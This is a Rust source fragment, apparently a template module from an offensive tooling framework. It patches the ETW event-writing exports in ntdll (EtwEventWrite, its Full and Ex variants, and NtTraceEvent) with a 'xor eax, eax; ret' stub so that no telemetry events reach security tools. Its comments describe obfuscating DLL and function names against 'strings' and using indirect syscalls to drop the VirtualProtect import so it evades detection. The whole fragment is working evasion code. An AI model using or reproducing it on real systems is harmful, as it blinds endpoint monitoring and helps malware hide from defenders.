// --- ETW patch (technique fragment) ---

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows::Win32::System::Threading::GetCurrentProcess;

// `xor eax, eax; ret`: returns STATUS_SUCCESS (0) and never writes an event.
// Written over the prologue of the event-writing exports.
//
// On x86 these exports are `stdcall` and pop their arguments, so that build
// replaces the `ret` with `ret imm16` and the patch is five bytes. The `imm16`
// is the export's `@N` decoration, read from `libwinapi_ntdll.a` with `nm`. A
// bare `ret` would leave the argument bytes on the caller's stack and corrupt
// the frame after the first event.

/// `_EtwEventWrite@20`: pops five argument dwords.
#[cfg(target_arch = "x86")]
const ETW_WRITE_PATCH: [u8; 5] = [0x33, 0xC0, 0xC2, 0x14, 0x00];
#[cfg(target_arch = "x86_64")]
const ETW_WRITE_PATCH: [u8; 3] = [0x33, 0xC0, 0xC3];

/// `_EtwEventWriteFull@32`: pops eight argument dwords.
#[cfg(target_arch = "x86")]
const ETW_WRITE_FULL_PATCH: [u8; 5] = [0x33, 0xC0, 0xC2, 0x20, 0x00];
#[cfg(target_arch = "x86_64")]
const ETW_WRITE_FULL_PATCH: [u8; 3] = [0x33, 0xC0, 0xC3];

/// `_EtwEventWriteEx@40`: pops ten argument dwords.
#[cfg(target_arch = "x86")]
const ETW_WRITE_EX_PATCH: [u8; 5] = [0x33, 0xC0, 0xC2, 0x28, 0x00];
#[cfg(target_arch = "x86_64")]
const ETW_WRITE_EX_PATCH: [u8; 3] = [0x33, 0xC0, 0xC3];

/// `_NtTraceEvent@16`: pops four argument dwords.
#[cfg(target_arch = "x86")]
const ETW_NT_TRACE_PATCH: [u8; 5] = [0x33, 0xC0, 0xC2, 0x10, 0x00];
#[cfg(target_arch = "x86_64")]
const ETW_NT_TRACE_PATCH: [u8; 3] = [0x33, 0xC0, 0xC3];

/// Whether to also patch the Full variant (best effort).
const PATCH_FULL: bool = $PATCH_FULL$;

/// Whether to also patch the Ex variant (best effort).
const PATCH_EX: bool = $PATCH_EX$;

/// Whether to also patch `NtTraceEvent`, the native entry (best effort).
const PATCH_NT_TRACE: bool = $PATCH_NT_TRACE$;

/// Patches the event-writing exports in the current process so no events reach
/// their consumers.
///
/// The main export failing aborts the preparation; the Full, Ex and
/// `NtTraceEvent` variants are best effort, because some Windows builds do not
/// export every variant and a missing secondary export must not discard a
/// working main patch.
///
/// Each export is patched with its own byte sequence: on x86 these exports are
/// `stdcall`, so the patch returns with `ret imm16` and pops the caller's
/// arguments instead of leaving them on the stack.
///
/// The DLL and function names are substituted at build time by
/// `Params::render_fragment` with code that rebuilds them at runtime, so they
/// do not appear in `strings`. The page protection changes go through the
/// syscall layer's `nt_protect_vm`, so `mode: indirect` removes the
/// `VirtualProtect` import.
pub fn patch_etw() -> Result<bool, String> {
    patch_export(&$ETW_DLL_DEF$, &$ETW_FUNC_DEF$, &ETW_WRITE_PATCH)?;
    if PATCH_FULL {
        patch_optional(&$ETW_DLL_DEF$, &$ETW_FULL_FUNC_DEF$, &ETW_WRITE_FULL_PATCH);
    }
    if PATCH_EX {
        patch_optional(&$ETW_DLL_DEF$, &$ETW_EX_FUNC_DEF$, &ETW_WRITE_EX_PATCH);
    }
    if PATCH_NT_TRACE {
        patch_optional(&$ETW_DLL_DEF$, &$ETW_NT_TRACE_FUNC_DEF$, &ETW_NT_TRACE_PATCH);
    }
    // A Preparation always continues the pipeline; only the `bouncer` gate
    // decides to abort (see `techniques/README.md`).
    Ok(true)
}

/// Patches an optional export, logging and ignoring a failure: not every
/// Windows build exports every variant, and a missing secondary export must not
/// discard a working main patch.
fn patch_optional(dll: &str, func: &str, patch: &[u8]) {
    if let Err(error) = patch_export(dll, func, patch) {
        crate::tech_dbg!("patch_etw", "optional export {func} skipped: {error}");
    }
}

/// Resolves `func` in `dll` and overwrites its prologue with `patch`.
///
/// The page protection covers exactly the bytes that are written — three bytes
/// on x64, five on x86 — so it follows the length of the patch slice.
fn patch_export(dll: &str, func: &str, patch: &[u8]) -> Result<(), String> {
    let dll = std::ffi::CString::new(dll).map_err(|_| $MSG_LOAD_FAILED$)?;
    let func = std::ffi::CString::new(func).map_err(|_| $MSG_LOAD_FAILED$)?;

    // The library is already loaded, so this only fetches its handle.
    let module = unsafe { LoadLibraryA(PCSTR(dll.as_ptr() as *const u8)) }
        .map_err(|_| $MSG_LOAD_FAILED$)?;
    let address = unsafe { GetProcAddress(module, PCSTR(func.as_ptr() as *const u8)) }
        .ok_or($MSG_RESOLVE_FAILED$)?;
    let target = address as usize as *mut u8;

    // Make the first bytes writable.
    let mut old_protect = 0u32;
    let status = crate::nt_protect_vm(
        unsafe { GetCurrentProcess() },
        target as *mut core::ffi::c_void,
        patch.len(),
        PAGE_EXECUTE_READWRITE.0,
        &mut old_protect,
    );
    if status < 0 {
        return Err($MSG_MAKE_WRITABLE_FAILED$);
    }

    // Write the patch.
    unsafe {
        for (i, byte) in patch.iter().enumerate() {
            *target.add(i) = *byte;
        }
    }

    // Restore the original protection.
    let status = crate::nt_protect_vm(
        unsafe { GetCurrentProcess() },
        target as *mut core::ffi::c_void,
        patch.len(),
        old_protect,
        &mut old_protect,
    );
    if status < 0 {
        return Err($MSG_RESTORE_PROTECTION_FAILED$);
    }
    crate::tech_dbg!(
        "patch_etw",
        "patched {}!{} at {target:p}",
        dll.to_string_lossy(),
        func.to_string_lossy()
    );

    Ok(())
}
